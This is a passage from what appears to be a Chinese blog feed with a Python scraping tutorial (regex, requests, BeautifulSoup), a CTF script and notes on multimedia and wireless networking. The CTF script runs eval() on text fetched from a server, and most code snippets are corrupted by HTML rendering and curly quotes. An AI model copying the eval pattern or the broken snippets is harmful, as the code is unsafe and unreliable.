flags=0):<br>2     “””Return a list of all non-overlapping matches in the string.<br>3<br>4     If one or more capturing groups are present in the pattern, return<br>5     a list of groups; this will be a list of tuples if the pattern<br>6     has more than one group.<br>7<br>8     Empty matches are included in the result.”””<br>9     return _compile(pattern, flags).findall(string)</p><pre><code>re.findall()可以获取字符串中所有匹配的字符串</code></pre><p>1 import re<br>2 test = ‘<a href="http://www.educity.cn/zhibo/" target="_blank">直播课堂</a>‘<br>3 print(re.findall(r’<a href="(.*)" target="_blank">(.*)</a>‘,test)) #[(‘<a href="http://www.educity.cn/zhibo/&#39;" target="_blank" rel="noopener">http://www.educity.cn/zhibo/&#39;</a>, ‘直播课堂’)]</p><pre><code>#### 3.2、常见匹配email</code></pre><p>import re<br>pattern = “\w+([.+-]\w+)<em>@\w+([.-]\w+)*.\w+([.-]\w+)</em>“<br>string = “<a href='http://www.baidu.com' target="_blank" rel="noopener">百度</a><br><a href='w.linkings@gail.com'>电邮</a>“<br>result = re.search(pattern,string)<br>print(result)<br>print(result.group(0))</p><pre><code>电话</code></pre><p>import re<br>pattern = “\d{4}-\d{7}|\d{3}-\d{8}”<br>string = “0551-54321234513451451345”<br>result1 = re.search(pattern,string)<br>print(result1)<br>print(result1.group(0))</p><pre><code>网站</code></pre><p>import re<br>pattern = “[a-zA-Z]+://[^\s]*[.com|.cn]”<br>string = “<a href='http://www.baidu.com' target="_blank" rel="noopener">百度首页</a>“<br>result1 = re.search(pattern,string)<br>print(result1)<br>print(result1.group(0))</p><pre><code>### 四、Session一道CTF简答的题目,讲表达式结果迅速返回到服务器（秋名山老司机</code></pre><p>import requests<br>import re<br>url = ‘<a href="http://120.24.86.145:8002/qiumingshan/&#39;" target="_blank" rel="noopener">http://120.24.86.145:8002/qiumingshan/&#39;</a><br>s = requests.Session()<br>source = s.get(url)<br>expression = re.search(r’(\d+[+-*])+(\d+)’, source.text).group()<br>result = eval(expression)<br>post = {‘value’: result}<br>print(s.post(url, data = post).text)</p><pre><code>### 五、更优雅的包，requests#### 5.1、简单使用</code></pre><blockquote><blockquote><blockquote><p>import requests<br>然后，尝试获取某个网页。本例子中，我们来获取Github的公共时间线<br>r = requests.get(‘<a href="https://github.com/timeline.json&#39;" target="_blank" rel="noopener">https://github.com/timeline.json&#39;</a>)<br>r = requests.post(“<a href="http://httpbin.org/post&quot;" target="_blank" rel="noopener">http://httpbin.org/post&quot;</a>)<br>r = requests.put(“<a href="http://httpbin.org/put&quot;" target="_blank" rel="noopener">http://httpbin.org/put&quot;</a>)<br>r = requests.delete(“<a href="http://httpbin.org/delete&quot;" target="_blank" rel="noopener">http://httpbin.org/delete&quot;</a>)<br>r = requests.head(“<a href="http://httpbin.org/get&quot;" target="_blank" rel="noopener">http://httpbin.org/get&quot;</a>)<br>r = requests.options(“<a href="http://httpbin.org/get&quot;" target="_blank" rel="noopener">http://httpbin.org/get&quot;</a>)</p></blockquote></blockquote></blockquote><pre><code>#### 5.2、为URL传递参数</code></pre><blockquote><blockquote><blockquote><p>payload = {‘key1’: ‘value1’, ‘key2’: ‘value2’}<br>r = requests.get(“<a href="http://httpbin.org/get&quot;" target="_blank" rel="noopener">http://httpbin.org/get&quot;</a>, params=payload)<br>通过打印输出该URL，你能看到URL已被正确编码:</p></blockquote></blockquote></blockquote><blockquote><blockquote><blockquote><p>print r.url<br>u’<a href="http://httpbin.org/get?key2=value2&amp;key1=value1&#39;" target="_blank" rel="noopener">http://httpbin.org/get?key2=value2&amp;key1=value1&#39;</a></p></blockquote></blockquote></blockquote><pre><code>#### 5.3、响应内容</code></pre><blockquote><blockquote><blockquote><p>import requests<br>r = requests.get(‘<a href="https://github.com/timeline.json&#39;" target="_blank" rel="noopener">https://github.com/timeline.json&#39;</a>)<br>r.text<br>‘[{“repository”:{“open_issues”:0,”url”:”<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>…</p></blockquote></blockquote></blockquote><pre><code>Requests会自动解码来自服务器的内容。大多数unicode字符集都能被无缝地解码。请求发出后，Requests会基于HTTP头部对响应的编码作出有根据的推测。当你访问r.text 之时，Requests会使用其推测的文本编码。你可以找出Requests使用了什么编码，并且能够使用 r.encoding 属性来改变它:</code></pre><blockquote><blockquote><blockquote><p>r.encoding<br>‘utf-8’<br>r.encoding = ‘ISO-8859-1’</p></blockquote></blockquote></blockquote><pre><code>如果你改变了编码，每当你访问 r.text ，Request都将会使用 r.encoding 的新值。#### 5.4、二进制响应内容你也能以字节的方式访问请求响应体，对于非文本请求:</code></pre><blockquote><blockquote><blockquote><p>r.content<br>b’[{“repository”:{“open_issues”:0,”url”:”<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>…</p></blockquote></blockquote></blockquote><pre><code>Requests会自动为你解码 gzip 和 deflate 传输编码的响应数据。例如，以请求返回的二进制数据创建一张图片，你可以使用如下代码:</code></pre><blockquote><blockquote><blockquote><p>from PIL import Image<br>from StringIO import StringIO<br>i = Image.open(StringIO(r.content))</p></blockquote></blockquote></blockquote><pre><code>#### 5.5、JSON响应内容</code></pre><blockquote><blockquote><blockquote><p>import requests<br>r = requests.get(‘<a href="https://github.com/timeline.json&#39;" target="_blank" rel="noopener">https://github.com/timeline.json&#39;</a>)<br>r.json()<br>[{u’repository’: {u’open_issues’: 0, u’url’: ‘<a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>…</p></blockquote></blockquote></blockquote><pre><code>如果JSON解码失败， r.json 就会抛出一个异常。#### 5.6、原始响应内容在罕见的情况下你可能想获取来自服务器的原始套接字响应，那么你可以访问 r.raw 。 如果你确实想这么干，那请你确保在初始请求中设置了 stream=True 。具体的你可以这么做:</code></pre><blockquote><blockquote><blockquote><p>r = requests.get(‘<a href="https://github.com/timeline.json&#39;" target="_blank" rel="noopener">https://github.com/timeline.json&#39;</a>, stream=True)<br>r.raw<br>&lt;requests.packages.urllib3.response.HTTPResponse object at 0x101194810&gt;<br>r.raw.read(10)<br>‘\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03’</p></blockquote></blockquote></blockquote><pre><code>#### 5.7、定制请求头如果你想为请求添加HTTP头部，只要简单地传递一个 dict 给 headers 参数就可以了。例如，在前一个示例中我们没有指定content-type:</code></pre><blockquote><blockquote><blockquote><p>import json<br>url = ‘<a href="https://api.github.com/some/endpoint&#39;" target="_blank" rel="noopener">https://api.github.com/some/endpoint&#39;</a><br>payload = {‘some’: ‘data’}<br>headers = {‘content-type’: ‘application/json’}<br>r = requests.post(url, data=json.dumps(payload), headers=headers)</p></blockquote></blockquote></blockquote><pre><code>### 六、BeautifulSoup4的基本使用安装</code></pre><p>pip install beautifulsoup4</p><pre><code>使用</code></pre><p>from bs4 import BeautifulSoup</p><p>html_str = “””<br>    <ul><br>        <li><br>            <a href="http://www.baidu.com/" target="_blank" rel="noopener">百度一下</a><br>        </li><br>        <li>合适的话发多少</li><br>        <li><br>            <a class="baidu" href="http://www.baidu.com/" target="_blank" rel="noopener">不会发生看到</a><br>        </li><br>        <li><br>            <a  id="lagou" href="http://www.lagou.com/" target="_blank" rel="noopener">lagou</a><br>        </li><br>        <li><br>            <label class="enterText enterArea">列表图预览：</label><br>            <p class="enterImg"><br>                <img id="previewImage" title='mmm' src="http://www.google.com/logo.png"/><br>            </p><br>            <div class="Validform_checktip">范德萨范德萨</div><br>        </li><br>    </ul><br>“””</p><p>soup = BeautifulSoup(html_str,’html.parser’)</p><p>#html对象  text文本去掉标签</p><h1 id="print-soup"><a href="#print-soup" class="headerlink" title="print(soup)"></a>print(soup)</h1><h1 id="print-soup-text"><a href="#print-soup-text" class="headerlink" title="print(soup.text)"></a>print(soup.text)</h1><h1 id="lt-class-‘bs4-BeautifulSoup’-gt-对象类型"><a href="#lt-class-‘bs4-BeautifulSoup’-gt-对象类型" class="headerlink" title="&lt;class ‘bs4.BeautifulSoup’&gt; 对象类型"></a>&lt;class ‘bs4.BeautifulSoup’&gt; 对象类型</h1><h1 id="print-type-soup"><a href="#print-type-soup" class="headerlink" title="print(type(soup))"></a>print(type(soup))</h1><h1 id="查找a标签-text打印a的内容"><a href="#查找a标签-text打印a的内容" class="headerlink" title="查找a标签 .text打印a的内容"></a>查找a标签 .text打印a的内容</h1><h1 id="print-soup-find-‘a’"><a href="#print-soup-find-‘a’" class="headerlink" title="print(soup.find(‘a’))"></a>print(soup.find(‘a’))</h1><h1 id="print-soup-find-‘a’-text"><a href="#print-soup-find-‘a’-text" class="headerlink" title="print(soup.find(‘a’).text)"></a>print(soup.find(‘a’).text)</h1><h1 id="查找a标签-class-baidu的"><a href="#查找a标签-class-baidu的" class="headerlink" title="查找a标签 class=baidu的"></a>查找a标签 class=baidu的</h1><h1 id="print-soup-find-‘a’-class-’baidu’"><a href="#print-soup-find-‘a’-class-’baidu’" class="headerlink" title="print(soup.find(‘a’,class_=’baidu’))"></a>print(soup.find(‘a’,class_=’baidu’))</h1><h1 id="查找id-lagou"><a href="#查找id-lagou" class="headerlink" title="查找id=lagou"></a>查找id=lagou</h1><h1 id="print-soup-find-id-’lagou’"><a href="#print-soup-find-id-’lagou’" class="headerlink" title="print(soup.find(id=’lagou’))"></a>print(soup.find(id=’lagou’))</h1><h1 id="查找title-’mmm’-前边可以写具体找哪个标签"><a href="#查找title-’mmm’-前边可以写具体找哪个标签" class="headerlink" title="查找title=’mmm’ 前边可以写具体找哪个标签"></a>查找title=’mmm’ 前边可以写具体找哪个标签</h1><h1 id="print-soup-find-title-’mmm’"><a href="#print-soup-find-title-’mmm’" class="headerlink" title="print(soup.find(title=’mmm’))"></a>print(soup.find(title=’mmm’))</h1><h1 id="find-all-找所有-返回一个list-数组类型"><a href="#find-all-找所有-返回一个list-数组类型" class="headerlink" title="find_all 找所有  返回一个list 数组类型"></a>find_all 找所有  返回一个list 数组类型</h1><h1 id="print-soup-find-all-‘a’"><a href="#print-soup-find-all-‘a’" class="headerlink" title="print(soup.find_all(‘a’))"></a>print(soup.find_all(‘a’))</h1><h1 id="print-soup-find-all-‘a’-0-第一个"><a href="#print-soup-find-all-‘a’-0-第一个" class="headerlink" title="print(soup.find_all(‘a’)[0]) #第一个"></a>print(soup.find_all(‘a’)[0]) #第一个</h1><p>all_a = soup.find_all(‘a’)<br>for item in all_a:<br>    if item:<br>        # print(item.attrs)<br>        print(item.attrs[‘href’]) #dict类型</p><p>```</p>]]></content>
      
      
      <categories>
          
          <category> 精通Python网络爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络自顶向下-多媒体网络</title>
      <link href="/2019/03/18/ji-suan-ji-wang-luo-zi-ding-xiang-xia-duo-mei-ti-wang-luo/"/>
      <url>/2019/03/18/ji-suan-ji-wang-luo-zi-ding-xiang-xia-duo-mei-ti-wang-luo/</url>
      
        <content type="html"><![CDATA[<h3 id="一、多媒体网络应用"><a href="#一、多媒体网络应用" class="headerlink" title="一、多媒体网络应用"></a>一、多媒体网络应用</h3><h4 id="1-1视频的性质"><a href="#1-1视频的性质" class="headerlink" title="1.1视频的性质"></a>1.1视频的性质</h4><ol><li>高比特率:视频最主要的特点就是极大地数据量,由此产生的高比特率的传输</li><li>可压缩:为了稍微减少传输的数据量,由此产生了压缩技术,比如会对空白区域进行处理或者由于视频一般具有较多的重复,由此来压缩视频</li><li>多版本:在服务器上放置不同版本不同质量的文件.</li></ol><h4 id="1-2音频的性质"><a href="#1-2音频的性质" class="headerlink" title="1.2音频的性质"></a>1.2音频的性质</h4><ol><li>音频一般是由专用的采样工具先采集样本,在转化为固定数量的量化值进行传输,接收方再解码,这样的技术被称为脉冲编码调制.</li><li>同视频一样,音频也可以进行压缩,MP3就是比较常用的一种技术.<a id="more"></a></li></ol><h4 id="1-3多媒体应用的分类"><a href="#1-3多媒体应用的分类" class="headerlink" title="1.3多媒体应用的分类"></a>1.3多媒体应用的分类</h4><p>多媒体应用主要可以分为以下几类:</p><ol><li>流式存储视频/音频:流是一种在选定播放时间点后可以直接播放而不用储存所有的数据再进行播放的一种技术.所以流式视频/音频可以进行暂停,重新定位等操作.而为了使视频/音频连续的播放,接收方必须不停接收数据,否则就会暂停播放.比如优酷,bilibili提供的一些非直播的视频.</li><li>会话式视频/音频:不同于流式存储视频/音频,这种方式是即时播放的.所以对时延的敏感性很高,有允许一些丢包,一般来说可以忍受.比如电话语音</li><li>流式实况视频/音频:应用的技术同流式存储视频/音频是一样的,只不过更加的注重实时播放,类似于电视直播那样,比如直播.</li></ol><h3 id="二-流式存储视频"><a href="#二-流式存储视频" class="headerlink" title="二.流式存储视频"></a>二.流式存储视频</h3><p>流式存储视频同音频的区别不大,主要是比特率大小的区别,介绍流式存储技术就用视频来介绍.每个视频都被放置在服务器上,并具有特定的URL地址.客户端一般都通过URL来请求特定的视频.而流式存储视频又分为三种:UDP流,HTTP流,适应性DASH流,三者具有相同的特性,他们都会在客户端拥有缓存以对抗延迟和丢包,当然也具有一些不同的特点.以下做简要的描述</p><h4 id="2-1、UDP流"><a href="#2-1、UDP流" class="headerlink" title="2.1、UDP流"></a>2.1、UDP流</h4><p>UDP流即使用UDP协议来传输视频数据,它具有的特点就是实时性,不像HTTP协议会被拥塞控制功能所控制速度.可以以最大的速度传输.也因为此,UDP流容易受到带宽变化所带来的影响.此外,使用UDP流需要额外的控制连接来控制视频的暂停,重定位等功能.由此也会给服务器带来额外的巨大消耗.最后,大量的UDP传输可能会被防火墙干掉.</p><h4 id="2-2、HTTP流"><a href="#2-2、HTTP流" class="headerlink" title="2.2、HTTP流"></a>2.2、HTTP流</h4><p>HTTP流则不同于UDP流,主要使用HTTP协议.第一个特点即使拥有视频预取机制,即比如当前播放的视频需要1k的带宽,但是服务器传输时却回传输更大的带宽(如果线路允许的话),以此在客户端更多的缓存数据,以此对抗网速的变化或者拥塞控制等因素.</p><p>HTTP流也不仅拥有客户端的应用缓存,还拥有接收缓存,和发送缓存,发送缓存在服务器中.以下是概念图:<br><img src="2.png" alt=""><br>黑色的代表已使用的缓存空间.当应用缓存存储满时,他会立即通知接收缓存,接着通知发送缓存,此时服务器变不会再发送数据了,相反,如果应用缓存缓存的数据别使用完了,即当前已经没有可以播放的缓存是,就会陷入暂停,直到接收到一定数量的缓存后,才可以继续播放.<br>HTTP流也具有重定位的功能,这是通过对视频文件指定固定地址的字节来实现的.</p><h4 id="2-3、适应性DASH流"><a href="#2-3、适应性DASH流" class="headerlink" title="2.3、适应性DASH流"></a>2.3、适应性DASH流</h4><p>因为各个用户的带宽大小不同,所以会在服务器上放置多种不同质量的视频文件,和一个告示文件,告示文件为每个视频映射一个URL地址,即可让用户得到不同质量的视频,</p><h4 id="2-4、内容分发网CDN"><a href="#2-4、内容分发网CDN" class="headerlink" title="2.4、内容分发网CDN"></a>2.4、内容分发网CDN</h4><p>以上即使流式存数视频技术的不同类型,但是,视频都会被放置在服务器上,内容分发网即使管理这些视频的网络.<br>一般的,这些服务器都是几个及其巨大的服务器集群.他们会邀请ISP接入以使用户获取希望获取的数据.<br>那么CDN是如何管理如此大量的视频的呢?CDN会借用DNS来截获和重定向请求.以下是步骤图:<br><img src="3.png" alt=""></p><p>首先,用户进入视频网站,比如优酷等等,接着发送报文指定希望获取的视频,DNS服务器则会请求权威DNS服务器以获取储存视频的服务器,接着便请求此服务器以获得视频地址,最后,从指定服务器获取希望取得的视频.</p><h3 id="三、IP语音"><a href="#三、IP语音" class="headerlink" title="三、IP语音"></a>三、IP语音</h3><h4 id="3-1-IP语音遇到问题"><a href="#3-1-IP语音遇到问题" class="headerlink" title="3.1 IP语音遇到问题"></a>3.1 IP语音遇到问题</h4><pre><code>前文已经讲过,由于会话式使用UDP(基本上使用UDP,有个例)来传输数据,所以会遇到丢包的问题,以及长时间的端到端时延,所以,如果在规定是时间内没有接受到包,此包就会被永远丢弃,而不再使用.IP语音还会遇到时延抖动的问题,即即使里在服务器,两个包是连续发送的,但是在接收方,他们可能是不连续到达的(路径不同,排队等因素),如果不做处理,就会播放出难以理解的内容.在接收方和发送方都可以进行一定的处理</code></pre><p>接收方:<br>可以固定播放时延,即在固定的时间后播放此数据.发送的包中添加发送时的时间戳,接收方接收后,如果此时已在固定播放的时延之后,此包就会被丢弃,不在播放,</p><p>发送方:<br>我们可以在发送前对包进行前向纠错EFC,比如把同一数据放入连个连续的包中,这样,即使丢了一个包,也可以通过另一包来恢复数据,或者在发送高质量数据的同时,在发送一段低质量的数据,当高质量包丢失或时延过高是,使用低质量的数据.也可以使用交织技术,主要原理是打乱包中数据的排序,这样,丢失了某个包后,因为是间歇性的丢失,因此对使用的影响较小</p><h4 id="3-2、RTP协议"><a href="#3-2、RTP协议" class="headerlink" title="3.2、RTP协议"></a>3.2、RTP协议</h4><p>即VoIP所使用的协议,一般运行在UDP协议之上.主要功能就是进行会话式语音/视频的传输.下图是报文结构:</p><p><img src="4.png" alt=""></p><ol><li>有效载荷类型:编码类型,比如音频可能就是PCM.</li><li>序号:用于检测丢包和恢复分组</li><li>时间戳:用于消除时延抖动</li><li>同步源标识符SSRC;表示了RTP流的源,一般来说,RTP会话中的每个流都有不同的SSRC值</li></ol><h4 id="3-3、会话发起协议SIP"><a href="#3-3、会话发起协议SIP" class="headerlink" title="3.3、会话发起协议SIP"></a>3.3、会话发起协议SIP</h4><p>主要功能是提供在呼叫者和被呼叫者经IP网络之间建立连接的功能.,连接的建立类似于三次握手,如下图:<br><img src="5.png" alt=""></p><p>SIP报文如下:</p><p><img src="6.png" alt=""></p><p>类似于SMTP协议,也有from和to首部行,Call-ID唯一标志此呼叫,也有描述类型和大小的首部行.</p><p>SIP地址不仅仅可以是如上图中的<a href="mailto:bob@xx.xx.xx.xx" target="_blank" rel="noopener">bob@xx.xx.xx.xx</a>,也可以邮箱地址或者手机号,这可以通过使用特殊的设备实现.<br>因为通过SIP地址来建立连接,而IP地址有可能是动态变化的,所以就需要使用到SIP代理和SIP注册器.</p><p>每个SIP用户都用相关联的SIP注册器,每当用户切换到新设别时,就会想SIP注册器注册新的IP地址.下图就是其作用机制:</p><p><img src="7.png" alt=""><br>呼叫者发送报文该SIP代理,指明希望呼叫的对象,SIP带了则向SIP注册器发送报文,说明希望获取的被呼叫者的SIP地址所对应的IP地址,如果此SIP注册器没有,就会返回报文,说那个SIP注册器拥有此映射,接着,SIP代理访问另一个SIP注册器,另一个SIP注册器接收到报文后,通知被呼叫的客户,别呼叫者通过以上链路返回一个报文,此时呼叫者和被呼叫者之就建立起了一次呼叫了.</p><h3 id="本章思维导图"><a href="#本章思维导图" class="headerlink" title="本章思维导图"></a>本章思维导图</h3><p><img src="1.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络自顶向下 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络自顶向下-无线网络和移动网络</title>
      <link href="/2019/03/18/ji-suan-ji-wang-luo-zi-ding-xiang-xia-wu-xian-wang-luo-he-yi-dong-wang-luo/"/>
      <url>/2019/03/18/ji-suan-ji-wang-luo-zi-ding-xiang-xia-wu-xian-wang-luo-he-yi-dong-wang-luo/</url>
      
        <content type="html"><![CDATA[<h3 id="一、概述："><a href="#一、概述：" class="headerlink" title="一、概述："></a>一、概述：</h3><p>这篇文章主要是讨论无线网络和移动网络即我们一般所说的WiFi和手机网络.主要分为4个部分<br>第一部分引言主要大致的描述一下无线网络和移动网络的特点以及和有限网络的区别<br>第二部分讨论WiFi<br>第三部分讨论蜂窝网络.由于有线网络和和无线网络的最大区别在于无线网络可以移动而且需要保持网络的连接<br>第四部分会讨论无线网络的移动管理.</p><a id="more"></a><h4 id="名词简介："><a href="#名词简介：" class="headerlink" title="名词简介："></a>名词简介：</h4><ol><li>无线主机（wireless host）。端系统。</li><li>无线链路（wireless communication link）。主机连接基站或另一台主机。</li><li>基站（base station）。主机和基站关联：主机位于基站的无线通信覆盖范围，且主机使用基站中继和更大的网络的数据。例如，蜂窝网中的 蜂窝塔（cell tower），Wifi中的接入点（access point）。</li><li>网络基础设施。与主机通信的更大的网络。</li></ol><p>与基站关联的主机以基础设施模式（infrastructure mode）运行，传统网络服务（地址分配、路由选择）通过基站提供给主机。自组织网络（ad hoc network）中，主机不与基站相连，主机本身提供这些服务。<br>无线网络类型。标准：无线网分组跨越的无线跳、是否有基础设施。 </p><ol><li>单跳、基于基础设施。802.11、3G蜂窝网等。</li><li>单跳、无基础设施。蓝牙、自组织模式的802.11</li><li>多跳、基于基础设施。结点通过无线结点中继通信，连接到基站，如无线网状网络。</li><li>多跳、无基础设施。移动自组织网络，包括车载自组织网络。</li></ol><h3 id="二、无线链路和网络特征"><a href="#二、无线链路和网络特征" class="headerlink" title="二、无线链路和网络特征"></a>二、无线链路和网络特征</h3><h4 id="2-1、与有限链路的区别"><a href="#2-1、与有限链路的区别" class="headerlink" title="2.1、与有限链路的区别"></a>2.1、与有限链路的区别</h4><p>无线链路和有限链路最主要的区别如下:</p><ol><li>递减的信号强度:随着阻碍物和距离的增加,信号的强度会有相当大的损失</li><li>来自其他源的干扰:无线信号会被其他源的无线信号干扰到,比如电磁炉</li><li>多径传播:同一个信号可能会经过多种物质的反射从而在不同时间点传播的同一接收点中.</li></ol><h4 id="2-2、会产生的问题"><a href="#2-2、会产生的问题" class="headerlink" title="2.2、会产生的问题"></a>2.2、会产生的问题</h4><p>由于信号的减弱和障碍物的作用,所以无线链路通信会产生一些有线链路所没有的问题</p><ol><li>信噪比SNR:即信号和噪音的比值,用于衡量信号的优劣,值越高代表信号越好,相反,若太低,则表明噪声太多,信号质量差</li><li>比特差错率BER:在无线链路的特性决定了传输的数据容易出现比特差错,BER用于衡量这一参数</li><li>隐藏终端问题:基站是需要多路访问协议即MAC协议来控制多个无线主机向此基站发送的数据,通常采用CSMA(码多分址),其原理已经介绍过了,主要就是将每一个比特乘以一个特殊的编码在接收端再次解码,通过不同的无线站点分配不同的编码以解决碰撞的问题.原理如下图:</li></ol><p><img src="1.png" alt=""><br>而无线链路的情况不同于有线链路,它很有可能是检测不到其他无线主机正在想基站发送数据的,比如其中一台无线主机被大山挡住,导致另一台主机不能接收到此主机正在发送数据的信号,再比如说,随着位置的增加,可能会有基站可以接受到两台无线主机信号而两台无线主机之间不能接受到彼此的信号的情况.这就被称为隐藏终端问题.如下图:<br><img src="2.png" alt=""></p><h3 id="三、Wifi-802-11无线LAN"><a href="#三、Wifi-802-11无线LAN" class="headerlink" title="三、Wifi(802.11无线LAN)"></a>三、Wifi(802.11无线LAN)</h3><h4 id="3-1、分类"><a href="#3-1、分类" class="headerlink" title="3.1、分类"></a>3.1、分类</h4><p>无线网络所使用的WiFi协议有许多种,他们分别有不同的频率范围和传输速度,如以下三种协议<br><img src="3.png" alt=""></p><h4 id="3-2、组成"><a href="#3-2、组成" class="headerlink" title="3.2、组成"></a>3.2、组成</h4><p>无线网络主要由两部分组成,一是基本服务集BSS,包括无线站点和接入点AP,他们都具有唯一的MAC地址,二是分组交换机,BSS就是通过分组交换机与因特网连接.如下图:</p><p><img src="4.png" alt=""></p><h4 id="3-3、信道与关联"><a href="#3-3、信道与关联" class="headerlink" title="3.3、信道与关联"></a>3.3、信道与关联</h4><p>那么无线站点是如何通过上图中的体系结构连接如互联网的呢?<br>每个基本服务集BSS都拥有一个SSID,用于唯一标识,WiFi协议信道的频率可以分为11个部分,他们互相之间有重叠,只有1,6,11号信道之间是完全没有重叠的,所以可以在一个物理网络中使用三个信道,每个基站都有自己的信号范围,那么我们定义WiFi丛林的概念,即无线站点在任意物质可以接收到多个基站所发出的信号,那么在这种情况之下,无线站点如何同基站关联的?<br>主要有两种方法:</p><ol><li>被动扫描:每个接入点AP都会周期性的发送信标帧,信标帧中包括该AP的SSID和MAC地址,无线站点为了关联AP,就会扫描11 个信道,然后选择一个与之关联</li><li>主动扫描:无线主机会向所有在其范围内的AP广播探测帧,AP接收到探测帧后会发送探测响应帧给无线站点,然后无线站点和AP关联</li></ol><p><img src="5.png" alt=""></p><h4 id="3-4、MAC协议"><a href="#3-4、MAC协议" class="headerlink" title="3.4、MAC协议"></a>3.4、MAC协议</h4><p>我们在无线链路可能会遇到的问题中已经描述过隐藏终端问题,WiFi有时如何解决碰撞和处理隐藏终端问题的呢?<br> WiFi所使用的MAC协议叫做CSMA/CA,CSMA即是载波侦听,其原理同以前讲述的一样,他会检测其他无线站点是否正在发送数据,如果是则停止传输,知道信道空闲.但是和以前不同的是,CA是碰撞避免,而不是CD碰转检测,因为CD完全不适用于无线链路,其一,两个无线站点之间如果需要互相检测到对方的发送信号所需的成本太大,其二,即使可以互相检测到信号,也会因为隐藏终端问题导致大量的重传.</p><p>碰撞避免CA的原理是:</p><ol><li>在发送信号之前,即侦听到信道空闲时,会在一个分布式帧间间隔DIFS的短时间后发送数据帧.</li><li>若信道繁忙,会选取一个随机回退值,每当侦听到信道空闲时此回退值就会减小,信道繁忙则会冻结回退值,当回退值为0时,发送数据帧</li><li>发送数据帧并等待确认,目的地则会在等待一个被称为短帧间间隔SIFS的短时间后发送确认帧.</li><li>如果源收到确认帧,表示被正确接收了,需要发送其他帧会从第二部开始.如果未收到确认,进入第二部的回退阶段,并从更大的范围选取回退值</li></ol><p><img src="6.png" alt=""><br> 而为了解决隐藏终端问题,在上述的基础上,源会在传输数据帧之前发送一个请求发送控制帧RTS,其中包含了此次传输需要的总时间,目的地在接收到RTS后等待SIFS的短时间,会广播一个允许发送控制帧CTS,CTS的目的是给发送方明确的发送许可及禁止其他无线站点在预约的时间内发送数据帧,但是这种处理方式会消耗信道资源,所以只有需要交换长数据时才会使用.<br><img src="7.png" alt=""></p><h4 id="3-5、帧结构"><a href="#3-5、帧结构" class="headerlink" title="3.5、帧结构"></a>3.5、帧结构</h4><p>802.11协议(WiFi)所使用的帧的结构如下图所示:<br><img src="8.png" alt=""></p><ol><li>帧控制:包含许多子字段,类型和子类型用于区分管理,RTS,CTS,ACK和数据帧,WEP用于知识是否加密,to,from定义不同地址字段的含义等等,不做具体描述</li><li>持续期:表示预约信道的时间,即在上文中描述的如何处理隐藏终端问题的预约时间</li><li>地址一:源MAC地址</li><li>地址二:接收该帧的设备的MAC地址</li><li>地址三:AP所连的交换机的MAC地址,是基本服务集BSS和因特网连接的关键</li><li>序号控制:用于区分帧的重传和新的发送</li><li>地址四:用于自组织间的MAC地址</li><li>有效载荷:存放数据</li><li>CRC:循环冗余检测字段</li></ol><h4 id="3-6、高级特色"><a href="#3-6、高级特色" class="headerlink" title="3.6、高级特色"></a>3.6、高级特色</h4><p> 802.11协议可以实现一些高级的功能,比如速率适应,无线站点会要求越来越多的带宽,知道接入点AP说”够了”,功率管理可以让无线 站点向接入点AP发送一个帧以设置一个定时器,无线站点进入睡眠模式,知道接入点在发送下一个信标帧时,唤醒该节点.</p><h3 id="四、蜂窝因特网"><a href="#四、蜂窝因特网" class="headerlink" title="四、蜂窝因特网"></a>四、蜂窝因特网</h3><h4 id="4-1、2G"><a href="#4-1、2G" class="headerlink" title="4.1、2G"></a>4.1、2G</h4><p>以下是2G网络的组成,统称为GSM蜂窝网体系:<br><img src="9.png" alt=""></p><ol><li>基站控制器BSC:连接几十个基站,执行寻呼,移动用户的切换</li><li>移动交换中心MSC:用于用户鉴别和账户管理,一级呼叫建立和切换</li><li>网关MSC:与更大的网络相连<h4 id="4-2、3G"><a href="#4-2、3G" class="headerlink" title="4.2、3G"></a>4.2、3G</h4><img src="10.png" alt=""><br>在2G的基础上,将BSC换为了RNC,并添加了一些新设备</li></ol><h3 id="五、802-15协议"><a href="#五、802-15协议" class="headerlink" title="五、802.15协议"></a>五、802.15协议</h3><p>除了WiFi和蜂窝网络之外,还有其他的无线网络,这里只做极其简单的介绍,</p><ol><li>蓝牙:使用802.15.1协议,以TDM方式工作于无需2.4GHz无线电波段,存在主设备和从设备之分,使用自组织模式,形成一个皮可网.</li></ol><p><img src="11.png" alt=""></p><ol start="2"><li>ZigBee:多个简化功能设备在单个全功能设备控制下运行.</li></ol><h3 id="最后给一张思维导图"><a href="#最后给一张思维导图" class="headerlink" title="最后给一张思维导图"></a>最后给一张思维导图</h3><p><img src="daotu.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络自顶向下 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CRC推导以及一道CRC32爆破例题</title>
      <link href="/2019/03/15/crc-tui-dao-yi-ji-yi-dao-crc32-bao-po-li-ti/"/>
      <url>/2019/03/15/crc-tui-dao-yi-ji-yi-dao-crc32-bao-po-li-ti/</url>
      
